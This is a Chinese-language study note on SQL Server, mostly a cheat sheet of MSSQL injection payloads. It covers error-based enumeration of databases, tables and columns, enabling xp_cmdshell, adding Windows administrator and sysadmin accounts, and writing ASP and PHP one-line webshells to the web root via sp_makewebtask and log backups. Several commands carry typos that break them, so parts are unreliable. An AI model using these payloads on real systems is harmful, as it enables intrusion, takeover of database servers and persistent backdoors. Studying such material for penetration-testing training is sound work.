#### sqlserver数据库介绍及操作

默认端口1433；

创建一个数据库，默认创建在路径中web.mdf;

任务，分离，删除链接，然后把创建的文件在默认路径中删掉就可以了；



1. 基础的查询语句：增删改查

   ` select * from table`

2. 数据库权限

   sa、db、public权限

   sa权利很大，db相当于普通票哪个用户，public相当于windows的guest用户；

#### 连接调用sqlserver数据库

调用数据库的代码，一般写在配置文件里面config, conn；

``` vb
<%
    set conn = server.createobject("adodb.connecton")
    conn.open "provider=sqloledb;source=local;uid=sa;pwd=***;database=database-name"
 %>
```

可能在的目录：==inc==/conn.asp，config.asp，web.config

#### sqlserver注入

判断是否有注入

```sql
1. 判断是否有注入  (会有变化)
and 1=1
and 1=2
/
-0
/*判断注入的方法是一样的*/

2. 初步判断是否是mssql
and user>0

3. 判断数据库系统
and (select count(*) from sysobjects)>0    /*mssql的系统表*/
and (select count(*) from msysobjects)>0   /*access的系统表*/

4. 注入参数是字符
and 

10. 测试权限结构   返回正常的话，就是对应的权限
and 1=(select IS_SRVROLEMEMBER('sysadmin'));--
and 1=(select IS_SRROLEMEMEMBER('serveradmin'));--
and 1=(select IS_SRROLEMEMEMBER('setupadmin'));--
and 1=(select IS_SRROLEMEMEMBER('securityadmin'));--
and 1=(select IS_SRROLEMEMEMBER('diskadmin'));--
and 1=(select IS_SRROLEMEMEMBER('bulkadmin'));--
adn 1=(select IS_MEMBER('db_owner'));--

11. 添加mssql和系统账户
exec master.dbo.sp_addlogin username;--
exec master.dbo.sp_password null, username,password;--
exec master.dbo.sp_addsrvrolemember sysadmin username;--
exec master.dbo.xp_cmdshell username;--
.....

```

- 手工判断注入

  `http://testasp.vulnweb.com/showforum.asp?id=0 '` 

- 获取数据库信息

  `id=1 and 1=(select @@version)  # 因为后面的查询结果是字符类型，转换失败，就爆出错误了`

  `id=@@version   # 等价` 

- 获取当前数据库名称

  `id=1 and 1=(select db_name())  # 也是由于类型不匹配`

- 获取第一个用户数据库

  `and 1=(select top 1 name from master..sysdatabases where dbid>4)`

  *获取从上往下数的第一行的name属性*

  - 判断接下来的数据库:

  `and 1=(select top 1 name from master..sysdatabases where dbid>5)` or

  `and 1=(select top 1 name from master..sysdatabases where dbid>4 and name<>'web')`

  会爆出错误：将nvarchar值'bookmis'转换为int类型时失败

  - ==非常牛逼的一个方法==

  `and 1=(select name from master..sysdatabases for xml path) # 把所有的数据库名按照xml列出`

- 获取第一张表

  `?id=1 and 1=(select top 1 name from sysobjects where xtype='u') #原理就是mssql报错信息`

- 获取表readers的列

  `?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name='readers'))`

- 获取表的数据

  `?id=1 and 1=(select top 1 Reader_id from readers)`

有过滤，如何绕过？

​	比如大小写转换，%0a、+、/**/代替空格； *+ 为什么可以代替空格？*


> 那如果前端做的比较好，不显示报错信息呢？
> syscolumns、sysdatabases 、sysobjects 具体代表了什么？
>  - sysdatabases和数据库信息有关，它的name表示所有的数据库，dbid列是他们的顺序，也是标识符
>  - sysobjects和数据库中的表的信息有关，name是表名，xtype='u'表示用户表，id是表的标识符
>  - syscolumns和表的列属性有关，name是列名，可以通过表的id来选择所属的表。


#### sqlserver另类玩法
#### 

- 利用mssql扩展存储注入攻击

  ``` sql
  1. 检测与恢复扩展存储
  /*判断xp_cmdhshell扩展存储是否存在*/
  and 1=(select name from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell')
  
  /*判断xp_regread扩展存储过程是否存在*/
  and 1=(select count(*) from master.dbo.sysobjects where name='xp_regread')
  
  /*恢复*/
  exec sp_configure 'show advanced options',1,reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure;
  exec sp_dropexetendedproc xp_cmdshell, 'xplog70.dll'
  
  2. sa权限下扩展存储攻击 利用方法
  /*安装完插件之后；利用xp_cmdshell扩展，执行任意命令*/
  /*查看C盘*/
  drop table black
  create table black(dire varchar(7996) NULL, id int not null identity(1,1))
  insert into black exec master..xp_cmdshell 'dir C:\' ;
  and 1=(select top 1 dire from black where id=1);
  
  /*新建windows用户*/
  exec master..xp_cmdshell 'net user test test /add'
  exec master..xp_cmdshell 'net localgroup administrators test /add'
  /*添加和删除一个SA权限的而用户test*/
  exec master.dbo.sp_addlogin test,password
  exec master.dbo.sap_addsrvrolemember test,sysadmin
  /*停掉或激活开个服务（need sa）*/
  exec master..xp_servicecontrol 'stop','schedule'
  exec master..xp_servicecontrol 'start','schedule'
  
  /*创建之后登陆，利用远程桌面，连接服务器（打开3389）*/
  
  /*开启远程数据库*/
  select * from OPENROWSET('SQLOLEDB','server=servername;uid=sa;pwd=_123', 
  'select * from table1')
  
  ```

  如果防火墙只允许我访问80，可以把80改成别的，但是会影响原来的呀；——端口转发or源控码

- 利用sp_makewebtask写入一句话木马

  要知道绝对路径，否则写不进去

  `;exec sp_makewebtask 'e:\www_iis\yjh.asp','select''%3C%25%65%76%61%6C%20%72%65%71%75%65%73%74%28%22%63%68%6F%70%70%65%72%22%29%25%3E'''--`

- 写入一句话木马

  找到web目录后，即可写入一句话木马(dbo权限)

  ``` sql
  ;alter database news set RECOVERY FULL 
  ;create table test(str image)-- 
  ;backup log news to disk='c:\test' with init-- 
  ;insert into test(str)values ('<%excute(request("cmd"))%>')-- 
  ;backup log news to disk='c:\inetpub\wwwroot\yjh.asp'-- 
  ;alter database news RECOVERY simple
  ```
   [扩展参考](https://www.cnblogs.com/shanmao/archive/2012/11/15/2770878.html)

> 端口转发
>
> 一句话木马是什么
>
> ​		 最直白的形式：把<%execute(request("value"))%>插入	到网页里。
>
> 一句话木马能干嘛
>
> ​	- 似乎是执行远程的value值，这个值是命令
>
> 一句话木马怎么写
>
> ​	- <%execute(request("value"))%>， <?php @eval($_POST[value]);?>

#### sqlserver差异备份、完全备份、权限入侵

